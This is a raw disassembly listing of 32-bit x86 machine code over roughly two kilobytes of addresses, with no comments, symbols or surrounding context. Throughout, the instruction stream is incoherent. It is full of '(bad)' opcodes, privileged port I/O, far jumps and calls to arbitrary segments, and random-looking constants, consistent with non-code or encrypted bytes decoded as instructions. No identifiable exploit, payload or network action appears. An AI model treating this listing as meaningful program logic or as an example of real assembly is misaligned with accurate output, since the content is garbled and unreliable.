  41bd15:	fucom  st(2)
  41bd17:	push   ebp
  41bd18:	ds jmp 0x58d6:0xca72f291
  41bd20:	arpl   WORD PTR [eax+0x3f],bx
  41bd23:	psubq  mm4,QWORD PTR [edx+0x1753469c]
  41bd2a:	and    dl,BYTE PTR [ebp+0x56]
  41bd2d:	adc    al,0x81
  41bd2f:	pop    esi
  41bd30:	pusha  
  41bd31:	jnp    0x41bcd4
  41bd33:	jbe    0x41bcdd
  41bd35:	jle    0x41bce8
  41bd37:	retf   0xf734
  41bd3a:	fmul   DWORD PTR [ebp-0x2ddbf710]
  41bd40:	pop    ss
  41bd41:	xchg   ecx,eax
  41bd42:	sbb    eax,0x54e303ec
  41bd47:	mov    cl,0x89
  41bd4a:	sub    DWORD PTR [ecx+0x1a04a145],edi
  41bd50:	out    0x85,al
  41bd52:	lea    ebx,[ebx-0x4b1b3c6b]
  41bd58:	std    
  41bd59:	rcr    BYTE PTR [ebp-0x4],0x1e
  41bd5d:	adc    al,0x54
  41bd5f:	and    BYTE PTR [edx],ch
  41bd61:	sahf   
  41bd62:	arpl   WORD PTR [esi-0x78b81e37],sp
  41bd68:	retf   0x8e25
  41bd6b:	pushf  
  41bd6c:	mov    ds:0x3fa3978c,al
  41bd71:	leave  
  41bd72:	mov    eax,0x2b69781
  41bd77:	fidivr WORD PTR [edi-0x4798c6a0]
  41bd7d:	jnp    0x41bdae
  41bd7f:	outs   dx,DWORD PTR ds:[esi]
  41bd80:	(bad)  
  41bd81:	aam    0xbc
  41bd83:	rcr    DWORD PTR [ebp+0x35],cl
  41bd86:	ja     0x41bd1f
  41bd88:	or     BYTE PTR [esi],ch
  41bd8a:	(bad)  
  41bd8b:	sub    al,0x7a
  41bd8d:	lock and BYTE PTR [edi-0x49],cl
  41bd91:	scas   al,BYTE PTR es:[edi]
  41bd92:	pop    ecx
  41bd93:	inc    ebp
  41bd94:	sub    ebx,DWORD PTR [edx]
  41bd96:	jg     0x41bde1
  41bd98:	daa    
  41bd99:	push   ecx
  41bd9a:	dec    ah
  41bd9c:	xchg   esp,eax
  41bd9d:	sub    eax,0xc3511684
  41bda2:	sbb    DWORD PTR [ebx-0x27],esi
  41bda5:	sti    
  41bda6:	cmp    bh,BYTE PTR [esi-0x3d6f3899]
  41bdac:	hlt    
  41bdad:	je     0x41bd98
  41bdaf:	fisttp DWORD PTR [edx+ebx*4+0x7a93a64b]
  41bdb6:	test   DWORD PTR [bx+di],esi
  41bdb9:	call   0xf277cd0
  41bdbe:	retf   
  41bdbf:	adc    eax,0x3e87eb74
  41bdc4:	test   BYTE PTR [esi+0x5efad5c7],ah
  41bdca:	xor    edx,DWORD PTR [ecx]
  41bdcc:	fwait
  41bdcd:	pushf  
  41bdce:	push   ebp
  41bdcf:	test   al,0x33
  41bdd1:	cmp    cl,BYTE PTR ds:0xaaee4271
  41bdd7:	or     esi,esi
  41bdd9:	cmp    al,0x61
  41bddb:	fidiv  WORD PTR [ebx]
  41bddd:	xchg   esi,eax
  41bdde:	pop    si
  41bde0:	enter  0x7fb,0x35
  41bde4:	in     al,dx
  41bde5:	mov    dh,BYTE PTR [ebp-0x2d]
  41bde8:	js     0x41be1e
  41bdea:	cld    
  41bdeb:	in     eax,dx
  41bdec:	(bad)  
  41bded:	call   0x9a24:0x1c487fe3
  41bdf4:	dec    ecx
  41bdf5:	loope  0x41bdb7
  41bdf7:	aam    0x54
  41bdf9:	or     ecx,ecx
  41bdfb:	data16 mov cl,0x8c
  41bdfe:	sbb    eax,0x94719a7e
  41be03:	(bad)  
  41be04:	push   esi
  41be05:	xchg   esi,eax
  41be06:	jmp    0x6aa53f15
  41be0b:	sbb    DWORD PTR [eax],esp
  41be0d:	dec    dl
  41be0f:	adc    al,0xc1
  41be11:	iret   
  41be12:	dec    edi
  41be13:	adc    al,0x75
  41be15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be16:	fidivr DWORD PTR [esi-0x55]
  41be19:	or     al,0x5d
  41be1b:	and    al,0x97
  41be1d:	mov    edi,0xd629300e
  41be22:	mov    ebp,0x5cadcc9c
  41be27:	pop    edi
  41be28:	bound  esp,QWORD PTR [ebx+0x1af7504e]
  41be2e:	mov    ecx,0x8940ebf2
  41be33:	push   ecx
  41be34:	repnz push esi
  41be36:	add    al,0xb9
  41be38:	dec    edx
  41be39:	mov    eax,0xfb3c03a7
  41be3e:	inc    eax
  41be3f:	ja     0x41bebc
  41be41:	push   es
  41be42:	frstor [ecx-0x16]
  41be45:	inc    ebp
  41be46:	mov    esi,0x9a951ee1
  41be4b:	jg     0x41be77
  41be4d:	xchg   BYTE PTR ds:[ebx+0x41ce31d7],cl
  41be54:	daa    
  41be55:	dec    ebx
  41be56:	and    BYTE PTR [edi],dh
  41be58:	mov    al,ds:0x98afde3f
  41be5d:	loopne 0x41be85
  41be5f:	mov    WORD PTR [ebx-0x44],es
  41be62:	daa    
  41be63:	xchg   ebp,eax
  41be64:	cmp    al,0x9f
  41be66:	mov    DWORD PTR [ecx+0x40fe6f7f],eax
  41be6c:	out    0x69,eax
  41be6e:	mov    bl,0xfe
  41be70:	and    al,0x32
  41be72:	mov    dh,0xf9
  41be74:	je     0x41be64
  41be76:	dec    edx
  41be77:	dec    ecx
  41be78:	and    al,0xc4
  41be7a:	mul    eax
  41be7c:	inc    esi
  41be7d:	mov    ds:0x334def9d,eax
  41be82:	dec    edi
  41be83:	sbb    ecx,DWORD PTR [esi+eiz*4]
  41be86:	outs   dx,BYTE PTR ds:[esi]
  41be87:	mov    ebp,0xa0b39178
  41be8c:	and    dh,BYTE PTR [edx]
  41be8e:	ins    DWORD PTR es:[edi],dx
  41be8f:	pop    edx
  41be90:	push   edi
  41be91:	fld    TBYTE PTR [edx-0x741a0f55]
  41be97:	push   ss
  41be98:	enter  0xa15a,0x65
  41be9c:	mov    fs,edx
  41be9e:	into   
  41be9f:	pop    ebx
  41bea0:	aam    0x14
  41bea2:	xor    DWORD PTR [ecx+0x81ffd9c],0xc
  41bea9:	add    esp,DWORD PTR [eax+0x42]
  41beac:	fisttp DWORD PTR [edi]
  41beae:	ret    
  41beaf:	test   al,0x8
  41beb1:	jae    0x41becd
  41beb3:	pop    ecx
  41beb4:	mov    eax,0xc4e7ee3c
  41beb9:	and    eax,0x2f466a23
  41bebe:	mov    esp,0xe5bf5bae
  41bec3:	out    0xa2,eax
  41bec5:	ins    DWORD PTR es:[edi],dx
  41bec6:	aam    0x53
  41bec8:	mov    edi,0x4d5ec07a
  41becd:	pop    es
  41bece:	add    eax,0xea507a9f
  41bed3:	jecxz  0x41be9f
  41bed5:	adc    al,0x7b
  41bed7:	shl    bh,cl
  41bed9:	xchg   DWORD PTR [ecx],ebp
  41bedb:	jmp    0x16fc80b8
  41bee0:	fst    QWORD PTR [esi-0x3164a9c2]
  41bee6:	jg     0x41be75
  41bee8:	pop    edx
  41bee9:	xor    DWORD PTR [esi+0x77557db],ebp
  41beef:	xchg   DWORD PTR [edx+0x15],ecx
  41bef2:	repz cs jb 0x41bedc
  41bef6:	push   ss
  41bef7:	pop    eax
  41bef8:	das    
  41bef9:	inc    ebp
  41befa:	mov    al,BYTE PTR [ecx-0x45]
  41befd:	stc    
  41befe:	(bad)  
  41bf00:	lods   al,BYTE PTR ds:[esi]
  41bf01:	ret    0x6754
  41bf04:	not    edx
  41bf06:	div    BYTE PTR ds:0xd87068f
  41bf0c:	inc    esi
  41bf0d:	mov    edi,0x89a6db20
  41bf12:	cwde   
  41bf13:	xchg   ebx,eax
  41bf14:	pop    edx
  41bf15:	sti    
  41bf16:	outs   dx,BYTE PTR ds:[esi]
  41bf17:	mov    al,0x6c
  41bf19:	and    ah,BYTE PTR [eax+0x44]
  41bf1c:	and    ah,0xed
  41bf1f:	jl     0x41bf2c
  41bf21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf22:	pop    es
  41bf23:	arpl   WORD PTR [ecx],ax
  41bf25:	cmp    BYTE PTR [ecx+eax*8],dh
  41bf28:	addr16 mov bl,0x8d
  41bf2b:	sti    
  41bf2c:	test   al,0x1b
  41bf2e:	add    al,0x5
  41bf30:	adc    ebx,eax
  41bf32:	and    DWORD PTR [edi+0x21],0xf7390a7c
  41bf39:	mov    al,ds:0x9afbaa0c
  41bf3e:	push   cs
  41bf3f:	xchg   esp,eax
  41bf40:	ja     0x41bef2
  41bf42:	cdq    
  41bf43:	pop    eax
  41bf44:	and    ah,dl
  41bf46:	test   BYTE PTR [esi+0x5f],bh
  41bf49:	inc    edi
  41bf4a:	popf   
  41bf4b:	mov    ebp,DWORD PTR [edi-0x5d7c6a08]
  41bf51:	lods   eax,DWORD PTR ds:[esi]
  41bf52:	sbb    ch,cl
  41bf54:	sbb    BYTE PTR [edi+0x6d4ee79d],0x92
  41bf5b:	xor    eax,0x91e94c19
  41bf60:	push   ecx
  41bf61:	pop    ds
  41bf62:	push   ebx
  41bf63:	dec    edi
  41bf64:	push   ecx
  41bf65:	mov    ecx,0x860df935
  41bf6a:	dec    ebp
  41bf6b:	jbe    0x41bf80
  41bf6d:	add    ebp,DWORD PTR [ecx-0x66]
  41bf70:	xor    DWORD PTR [esi],eax
  41bf72:	fsub   DWORD PTR [ebx+0x505c201c]
  41bf78:	daa    
  41bf79:	pop    esi
  41bf7a:	jle    0x41bf44
  41bf7c:	pop    ss
  41bf7d:	sbb    DWORD PTR [ebp-0x47aebdc5],edx
  41bf83:	adc    al,BYTE PTR [ebx+0x39]
  41bf86:	or     esp,DWORD PTR [edi-0x53]
  41bf89:	push   0xa1cb6211
  41bf8e:	push   esp
  41bf8f:	in     eax,0xca
  41bf91:	adc    ebx,0x7ddacf1a
  41bf97:	xor    BYTE PTR [ebp-0x4e6aecbc],bl
  41bf9d:	adc    ah,BYTE PTR [eax]
  41bf9f:	adc    bl,bh
  41bfa1:	daa    
  41bfa2:	pop    ecx
  41bfa3:	xchg   ebp,eax
  41bfa4:	ds fwait
  41bfa6:	jmp    0x41bf3b
  41bfa8:	fstp   QWORD PTR [ecx]
  41bfaa:	inc    esp
  41bfab:	stos   BYTE PTR es:[edi],al
  41bfac:	daa    
  41bfad:	xlat   BYTE PTR ds:[ebx]
  41bfae:	xchg   edi,eax
  41bfaf:	mov    ebp,0x4ee6976b
  41bfb4:	and    eax,0x2c0a4ac3
  41bfb9:	js     0x41bf62
  41bfbb:	or     ah,BYTE PTR [esi-0xa]
  41bfbe:	pop    ebp
  41bfbf:	mov    ecx,0x70ef00ab
  41bfc4:	ret    0x1876
  41bfc7:	dec    esp
  41bfc8:	push   0xf35b14a0
  41bfcd:	xchg   DWORD PTR [edx-0x2ae277ea],ecx
  41bfd3:	in     eax,0x22
  41bfd5:	sti    
  41bfd6:	shl    BYTE PTR [edi+0x1],1
  41bfd9:	mov    esi,0xf77dc8e4
  41bfde:	mov    al,ds:0xc7ca6935
  41bfe3:	add    eax,ebx
  41bfe5:	pop    ss
  41bfe6:	in     eax,dx
  41bfe7:	or     al,0x55
  41bfe9:	add    BYTE PTR [edi+0x42],al
  41bfec:	ficomp DWORD PTR [edx+0x4bbf63f1]
  41bff2:	jns    0x41c01e
  41bff4:	xchg   BYTE PTR [edi],dh
  41bff6:	mov    ch,ch
  41bff8:	mov    ecx,DWORD PTR [eax]
  41bffa:	retf   
  41bffb:	inc    esi
  41bffc:	dec    edx
  41bffd:	xor    al,0xbb
  41bfff:	cld    
  41c000:	out    0x6,eax
  41c002:	lds    esp,FWORD PTR [eax-0x66]
  41c005:	(bad)  
  41c006:	ficom  WORD PTR [ecx-0x3b]
  41c009:	imul   eax,DWORD PTR [eax-0x4f31680],0x8c841de7
  41c013:	xor    DWORD PTR ds:0x7bce354e,edi
  41c019:	dec    eax
  41c01a:	mov    eax,0xcc58f2e1
  41c01f:	int3   
  41c020:	pop    ecx
  41c021:	xor    BYTE PTR [eax+0x5ec1a666],ah
  41c027:	xchg   ebp,eax
  41c028:	rcl    BYTE PTR [esi+0x75f3ba60],1
  41c02e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c02f:	or     DWORD PTR [ecx+0x3ea612af],edx
  41c035:	mov    ch,0xe5
  41c037:	fwait
  41c038:	cs push 0xc2dc9d53
  41c03e:	enter  0x7535,0x5a
  41c042:	xor    dh,bh
  41c044:	pop    edx
  41c045:	jle    0x41c03b
  41c047:	jns    0x41c08b
  41c049:	mov    ?,WORD PTR [edi-0x3f1d8f1a]
  41c04f:	test   BYTE PTR [edi-0x29be3910],ch
  41c055:	outs   dx,DWORD PTR ds:[esi]
  41c056:	imul   eax,DWORD PTR [ebx+esi*2-0x2b60bc2c],0x47bf76ec
  41c061:	adc    edx,DWORD PTR [esi]
  41c063:	cmp    ah,BYTE PTR [eax]
  41c065:	mov    dh,0x2e
  41c067:	je     0x41bfed
  41c069:	mov    cl,0xe0
  41c06b:	fisttp WORD PTR [edx-0x4cb6ef31]
  41c071:	and    edi,ebp
  41c073:	xchg   ebx,eax
  41c074:	add    eax,0x5e0b74de
  41c079:	out    dx,al
  41c07a:	ja     0x41c0c0
  41c07c:	sub    esp,DWORD PTR [ebx+0x50ff238f]
  41c082:	pop    eax
  41c083:	aad    0x11
  41c085:	mov    ebx,0x67fe4960
  41c08a:	jp     0x41c01c
  41c08c:	es pop ds
  41c08e:	outs   dx,BYTE PTR ds:[esi]
  41c08f:	push   eax
  41c090:	xchg   DWORD PTR [ebx+0x59cf5aa],ebx
  41c096:	xor    edi,DWORD PTR [ebp+0x47]
  41c099:	retf   0x6b0c
  41c09c:	sub    BYTE PTR [edi+0x6a73b87d],0x50
  41c0a3:	xchg   esp,eax
  41c0a4:	xchg   DWORD PTR [ebx+0x54],edx
  41c0a7:	xchg   edx,eax
  41c0a8:	jecxz  0x41c056
  41c0aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0ab:	or     dh,al
  41c0ad:	imul   ebx,DWORD PTR [edx+ebp*4+0x2be9d242],0xa
  41c0b5:	push   esi
  41c0b6:	inc    edx
	...
  41c0bf:	add    BYTE PTR [eax],al
  41c0c1:	retf   
  41c0c2:	test   al,0x91
  41c0c4:	sbb    eax,0xfecf3df3
  41c0c9:	dec    ebp
  41c0ca:	fisub  DWORD PTR [ecx+edi*1+0x65]
  41c0ce:	ins    DWORD PTR es:[edi],dx
  41c0cf:	cmp    DWORD PTR [ebp-0x7d],esi
  41c0d2:	cmp    eax,0x3ae0001
  41c0d7:	add    BYTE PTR [eax],al
  41c0d9:	or     al,0x9c
  41c0db:	retf   0x9edc
  41c0de:	dec    edi
  41c0df:	fdiv   DWORD PTR [edx]
  41c0e1:	mov    esp,0xccf7148c
  41c0e6:	and    ebp,DWORD PTR [eax-0x35b28b29]
  41c0ec:	mov    fs,WORD PTR ds:0xc2326f5e
  41c0f2:	cmp    cl,BYTE PTR [ecx+0x26]
  41c0f5:	stc    
  41c0f6:	mov    ebp,es
  41c0f8:	mov    dl,0xf6
  41c0fa:	test   DWORD PTR [edx+0x58],edi
  41c0fd:	mov    ecx,0x79fdbf48
  41c102:	out    0xab,al
  41c104:	sub    esp,ecx
  41c106:	mov    ?,WORD PTR [eax+0xc51a883]
  41c10c:	push   esi
  41c10d:	test   BYTE PTR [esi+0x497194d7],cl
  41c113:	xor    al,0x51
  41c115:	jle    0x41c192
  41c117:	lahf   
  41c118:	mov    bh,0xe2
  41c11a:	js     0x41c141
  41c11c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c11d:	mov    ebx,edx
  41c11f:	loope  0x41c185
  41c121:	cs push cs
  41c123:	push   esi
  41c124:	mov    ecx,0x3f050e1a
  41c129:	int3   
  41c12a:	sub    DWORD PTR [ecx+0x65625dec],0x62
  41c131:	xor    ebx,DWORD PTR [ebx-0xe]
  41c134:	test   eax,0x67830342
  41c139:	enter  0x1112,0x64
  41c13d:	xchg   DWORD PTR [eax+0x2a5c3295],eax
  41c143:	mov    ebx,0x870377d9
  41c148:	pop    ebp
  41c149:	out    0xeb,eax
  41c14b:	mov    ds:0x93ad3ef2,eax
  41c150:	pop    ss
  41c151:	add    eax,0xa17374c3
  41c156:	inc    esp
  41c157:	in     al,0x64
  41c159:	dec    esi
  41c15a:	pushf  
  41c15b:	sbb    al,0xc9
  41c15d:	lods   al,BYTE PTR ds:[esi]
  41c15e:	jbe    0x41c159
  41c160:	cmovns edx,DWORD PTR [ebx-0x7765e64]
  41c167:	mov    edi,0xb277315c
  41c16c:	retf   0xe1f5
  41c16f:	aaa    
  41c170:	sbb    ecx,DWORD PTR [edi-0x5ef7f8a]
  41c176:	bound  edi,QWORD PTR [edx+0x39b25383]
  41c17c:	mov    DWORD PTR [edi],ebx
  41c17e:	and    BYTE PTR [edx+0x7f644eec],ch
  41c184:	leave  
  41c185:	mov    BYTE PTR ds:0xe1fb510d,dh
  41c18b:	bound  esi,QWORD PTR [esi]
  41c18d:	jle    0x41c147
  41c18f:	mov    esi,ebx
  41c191:	pop    ds
  41c192:	lock dec edx
  41c194:	cld    
  41c195:	push   esp
  41c196:	mov    eax,0x1ba41d8d
  41c19b:	mov    ebp,0x8e45ca95
  41c1a0:	aad    0xac
  41c1a2:	sub    ebp,DWORD PTR [ecx-0x2ca09bb0]
  41c1a8:	cmc    
  41c1a9:	int    0x61
  41c1ab:	outs   dx,DWORD PTR ds:[si]
  41c1ad:	dec    ebx
  41c1ae:	cmp    ah,BYTE PTR [edi]
  41c1b0:	xor    cl,dl
  41c1b2:	xor    DWORD PTR ds:[edi-0x5668ac8d],esi
  41c1b9:	and    ecx,DWORD PTR [edi-0x4a]
  41c1bc:	call   0x7ce9:0xcaaa59
  41c1c3:	jg     0x41c234
  41c1c5:	outs   dx,BYTE PTR ds:[esi]
  41c1c6:	sbb    al,0xcc
  41c1c8:	and    DWORD PTR ds:0x2966e405,edi
  41c1ce:	push   es
  41c1cf:	sub    eax,0x86526e73
  41c1d4:	test   al,0x57
  41c1d6:	scas   al,BYTE PTR es:[edi]
  41c1d7:	sub    ecx,DWORD PTR [ebx+0x51231620]
  41c1dd:	cmp    eax,0xab8f4e69
  41c1e2:	mov    dl,0xe
  41c1e4:	sub    eax,0xb0167903
  41c1e9:	sub    al,0xec
  41c1eb:	lds    ebp,FWORD PTR [eax+0x1d14ac31]
  41c1f1:	jne    0x41c261
  41c1f3:	(bad)  
  41c1f4:	rol    DWORD PTR [ecx+esi*2-0x9],1
  41c1f8:	lods   eax,DWORD PTR ds:[esi]
  41c1f9:	jmp    0x425:0x940d7f6d
  41c200:	cmc    
  41c201:	aam    0x34
  41c203:	es cmc 
  41c205:	icebp  
  41c206:	add    ebp,DWORD PTR [edx+0x620de4fd]
  41c20c:	enter  0x4df,0x95
  41c210:	and    BYTE PTR [edi+0x4f740a2],bh
  41c216:	jo     0x41c21f
  41c218:	pop    ecx
  41c219:	(bad)  
  41c21a:	pop    esi
  41c21b:	cmc    
  41c21c:	into   
  41c21d:	and    BYTE PTR [esi],dh
  41c21f:	fwait
  41c220:	loop   0x41c28d
  41c222:	adc    al,0x2c
  41c224:	jl     0x41c282
  41c226:	dec    ebx
  41c227:	cmp    ch,BYTE PTR [edx]
  41c229:	inc    esp
  41c22a:	mov    edi,0xd0b929c1
  41c22f:	mov    al,ds:0xcc1b4e58
  41c234:	adc    eax,0x60c112f3
  41c239:	cwde   
  41c23a:	push   cs
  41c23b:	stc    
  41c23c:	jmp    0x41c223
  41c23e:	xor    BYTE PTR [ebp-0x7ff07840],dl
  41c244:	cmp    dl,BYTE PTR [esi]
  41c246:	call   0x6424:0xa2dec003
  41c24d:	jmp    0x4b1461df
  41c252:	xor    DWORD PTR [ebx],edi
  41c254:	jmp    0xa688dd53
  41c259:	mov    edx,0x6f4e5f8a
  41c25e:	popf   
  41c25f:	lods   eax,DWORD PTR ds:[esi]
  41c260:	je     0x41c2b9
  41c262:	or     DWORD PTR [eax+0x2f3ad4a2],ebx
  41c268:	xchg   DWORD PTR [ebp+esi*1-0x2f59b53b],edx
  41c26f:	repnz into 
  41c271:	sbb    BYTE PTR [eax+0x4d8543d1],dl
  41c277:	lock and eax,0x6e4d36e1
  41c27d:	inc    ebx
  41c27e:	mov    ds:0x6c3efb75,al
  41c283:	enter  0x8fd4,0x7a
  41c287:	das    
  41c288:	(bad)  
  41c289:	into   
  41c28a:	mov    al,ds:0x84ebfd69
  41c28f:	gs inc esi
  41c291:	int3   
  41c292:	xchg   ecx,eax
  41c293:	sub    al,0xc4
  41c295:	sbb    al,0x4a
  41c297:	or     DWORD PTR [esi+0x47],0xffffff9c
  41c29b:	dec    ebx
  41c29c:	sub    al,0x1d
  41c29e:	nop
  41c29f:	push   ds
  41c2a0:	pop    edi
  41c2a1:	lods   al,BYTE PTR ds:[esi]
  41c2a2:	mov    bl,0x3b
  41c2a4:	loopne 0x41c256
  41c2a6:	jg     0x41c26c
  41c2a8:	xor    BYTE PTR [ebp-0x71beb061],0x13
  41c2af:	jmp    0xb8311e15
  41c2b4:	push   cs
  41c2b5:	sub    al,0x1b
  41c2b7:	adc    BYTE PTR ds:0xfe19500e,0x98
  41c2be:	add    bl,bl
  41c2c0:	inc    esp
  41c2c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2c2:	mov    ecx,0xc06cc0a6
  41c2c7:	stc    
  41c2c8:	or     al,0x5f
  41c2ca:	inc    edx
  41c2cb:	sub    DWORD PTR [edi-0x27188bb3],esp
  41c2d1:	in     eax,dx
  41c2d2:	sbb    BYTE PTR [esi-0x65],0x99
  41c2d6:	pop    edi
  41c2d7:	sub    al,0xb5
  41c2d9:	ret    
  41c2da:	cmp    ebp,DWORD PTR [edx]
  41c2dc:	or     eax,0x416e474
  41c2e1:	ss and al,0x7a
  41c2e4:	(bad)  [edi]
  41c2e6:	nop
  41c2e7:	shl    DWORD PTR [eax+0x4a1d751],0x7
  41c2ee:	rep lods eax,DWORD PTR ds:[esi]
  41c2f0:	jge    0x41c2da
  41c2f2:	leave  
  41c2f3:	adc    eax,0x255dcf48
  41c2f8:	shl    BYTE PTR [edi+edx*8],0xf9
  41c2fc:	inc    eax
  41c2fd:	pushf  
  41c2fe:	in     al,0x7f
  41c300:	jmp    0x108e:0x7bcf2b50
  41c307:	and    al,0x27
  41c309:	or     bl,BYTE PTR [esi+0x54]
  41c30c:	(bad)  [ecx+0xa]
  41c30f:	sub    al,0xba
  41c311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c312:	(bad)  
  41c313:	sub    edx,DWORD PTR [esi+eax*2]
  41c316:	xor    DWORD PTR [edi],0x4e625023
  41c31c:	mov    ch,BYTE PTR [eax-0xd]
  41c31f:	int3   
  41c320:	jno    0x41c393
  41c322:	push   ds
  41c323:	lahf   
  41c324:	out    dx,eax
  41c325:	daa    
  41c326:	jae    0x41c2dd
  41c328:	push   es
  41c329:	add    DWORD PTR [ecx-0x65ba4cc3],ecx
  41c32f:	adc    BYTE PTR [esi+esi*2-0x8a75d00],bl
  41c336:	cmp    DWORD PTR [eax-0x7e],eax
  41c339:	hlt    
  41c33a:	mov    al,ds:0xd1d04092
  41c33f:	xor    DWORD PTR [edx-0x508012d5],eax
  41c345:	enter  0x607c,0x37
  41c349:	jmp    DWORD PTR [ebx*2-0x10936d06]
  41c350:	mov    WORD PTR [eax+esi*1],cs
  41c353:	inc    ecx
  41c354:	sti    
  41c355:	(bad)  
  41c357:	sar    DWORD PTR [edi],1
  41c359:	ret    0x8121
  41c35c:	ja     0x41c3da
  41c35e:	ss mov ebp,0x37986011
  41c364:	or     DWORD PTR [edx-0x3a],esi
  41c367:	neg    BYTE PTR [eax-0x6642e724]
  41c36d:	(bad)  
  41c36e:	jmp    0x139f58f0
  41c373:	data16 fmul st,st(2)
  41c376:	xchg   esi,eax
  41c377:	pop    edx
  41c378:	fisttp DWORD PTR [edx-0x1e]
  41c37b:	mov    ebp,0xdb5ab01b
  41c380:	retf   0x5473
  41c383:	int3   
  41c384:	dec    ebx
  41c385:	pop    ebp
  41c386:	push   ss
  41c387:	dec    esi
  41c388:	call   0xd10f6e49
  41c38d:	ins    BYTE PTR es:[edi],dx
  41c38e:	xchg   BYTE PTR [ebx-0x73468d05],dl
  41c394:	bound  esp,QWORD PTR [ecx-0x34]
  41c397:	dec    edi
  41c398:	mov    esp,0xcfa5eb8f
  41c39d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c39e:	xor    DWORD PTR [esi+0x2fe78f34],edx
  41c3a4:	adc    DWORD PTR [edx-0xc44524f],0xffffffbf
  41c3ab:	pop    edx
  41c3ac:	loope  0x41c3b8
  41c3ae:	mov    eax,0x2826240d
  41c3b3:	xchg   ecx,eax
  41c3b4:	test   ah,bl
  41c3b6:	test   DWORD PTR [eax+0x4782a812],esi
  41c3bc:	or     edi,DWORD PTR [ebp+0x1e]
  41c3bf:	adc    eax,DWORD PTR [ecx+0x27b7c806]
  41c3c5:	in     eax,dx
  41c3c6:	mov    bl,0x11
  41c3c8:	pop    ebx
  41c3c9:	jl     0x41c434
  41c3cb:	mov    bh,0x13
  41c3cd:	ds pushf 
  41c3cf:	dec    edx
  41c3d0:	xchg   ebp,eax
  41c3d1:	mov    dh,0x94
  41c3d3:	add    al,0xe7
  41c3d5:	loopne 0x41c39f
  41c3d7:	popa   
  41c3d8:	mov    DWORD PTR [eax+0x7f],eax
  41c3db:	ror    DWORD PTR [edx],0x1c
  41c3de:	mov    edi,0x85c37bb8
  41c3e3:	test   BYTE PTR [edi],ah
  41c3e5:	out    dx,al
  41c3e6:	mov    dl,0x87
  41c3e8:	dec    edi
  41c3e9:	mov    edi,DWORD PTR [ecx-0x36429cc3]
  41c3ef:	lods   al,BYTE PTR ds:[esi]
  41c3f0:	push   ebx
  41c3f1:	pop    ebp
  41c3f2:	or     dl,BYTE PTR [ecx+0x4bc1d7e8]
  41c3f8:	jno    0x41c3e4
  41c3fa:	fs aas 
  41c3fc:	cwde   
  41c3fd:	inc    ebx
  41c3fe:	test   eax,0xa6eb9f10
  41c403:	push   eax
  41c404:	push   esp
  41c405:	xor    esp,eax
  41c407:	jb     0x41c427
  41c409:	(bad)  
  41c40a:	jecxz  0x41c44c
  41c40c:	sub    ecx,esp
  41c40e:	jl     0x41c3b3
  41c410:	popa   
  41c411:	sub    eax,0x99040669
  41c416:	test   DWORD PTR [ebp+0x26d86107],edi
  41c41c:	in     eax,dx
  41c41d:	cli    
  41c41e:	test   eax,0x78b48d7
  41c423:	ficom  DWORD PTR [esi]
  41c425:	scas   al,BYTE PTR es:[edi]
  41c426:	dec    eax
  41c427:	stc    
  41c428:	gs mov ah,0x97
  41c42b:	jne    0x41c3ae
  41c42d:	sahf   
  41c42e:	sahf   
  41c42f:	dec    BYTE PTR [ebp-0x63]
  41c432:	xor    bh,ah
  41c434:	outs   dx,DWORD PTR ds:[esi]
  41c435:	jbe    0x41c409
  41c437:	rcr    BYTE PTR [edx+0x23],1
  41c43a:	sbb    ebx,ebp
  41c43c:	pop    edx
  41c43d:	test   BYTE PTR [esp+ebx*8],dl
  41c440:	sahf   
  41c441:	pop    edi
  41c442:	inc    edi
  41c443:	cmp    edx,DWORD PTR [edx-0x74]
  41c446:	data16 mov bh,0x58
  41c449:	cmp    bl,BYTE PTR [esi]
  41c44b:	xchg   esi,eax
  41c44c:	push   es
  41c44d:	test   al,0x39
  41c44f:	pop    ds
  41c450:	pop    eax
  41c451:	push   ss
  41c452:	leave  
  41c453:	adc    ebp,DWORD PTR [esi-0x57]
  41c456:	(bad)  
  41c457:	push   cs
  41c458:	xchg   ebx,eax
  41c459:	xchg   esi,eax
  41c45a:	ins    DWORD PTR es:[edi],dx
  41c45b:	mov    WORD PTR [ebx+edx*1-0x799d17ec],cs
  41c462:	mov    edx,DWORD PTR ds:0x7d81c8b5
  41c468:	cli    
  41c469:	mov    ah,0xe0
  41c46b:	adc    al,0x6e
  41c46d:	xchg   ebp,eax
  41c46e:	mov    bh,0xa0
  41c470:	or     al,BYTE PTR [ebx+0x65]
  41c473:	mov    ah,0x53
  41c475:	adc    eax,0xcd419586
  41c47a:	jl     0x41c44f
  41c47c:	fcom   DWORD PTR [ebx]
  41c47e:	jmp    0x41c421
  41c480:	add    eax,0x293f6286
  41c485:	outs   dx,DWORD PTR ds:[esi]
  41c486:	nop
	...
  41c48f:	add    BYTE PTR [eax],al
  41c491:	mov    ah,0x4f
  41c493:	sbb    al,0x53
  41c495:	call   DWORD PTR [ebx-0x1]
  41c498:	out    dx,eax
  41c499:	inc    esi
  41c49a:	dec    esp
  41c49b:	add    eax,0xe77cfe32
  41c4a0:	aam    0x31
  41c4a2:	inc    ecx
  41c4a3:	add    DWORD PTR [eax],eax
  41c4a5:	scas   al,BYTE PTR es:[edi]
  41c4a6:	add    eax,DWORD PTR [eax]
  41c4a8:	add    ch,dh
  41c4aa:	in     eax,0x91
  41c4ac:	mov    dl,0xeb
  41c4ae:	aaa    
  41c4af:	push   edi
  41c4b0:	jp     0x41c4e1
  41c4b2:	sbb    eax,0xeb1f2fd6
  41c4b7:	jg     0x41c46f
  41c4b9:	mov    bl,0xba
  41c4bb:	jle    0x41c4b8
  41c4bd:	mov    ch,0x97
  41c4bf:	dec    eax
  41c4c0:	and    eax,0xff59ffe2
  41c4c5:	hlt    
  41c4c6:	xor    edi,DWORD PTR [ebx+0x19333bfb]
  41c4cc:	cmp    DWORD PTR [eax-0x6],ecx
  41c4cf:	ret    0x21cc
  41c4d2:	aaa    
  41c4d3:	lock xchg esi,eax
  41c4d5:	push   edi
  41c4d6:	into   
  41c4d7:	lods   al,BYTE PTR ds:[esi]
  41c4d8:	xchg   ebx,eax
  41c4d9:	mov    ah,0xfc
  41c4db:	mov    ebx,0x953982d2
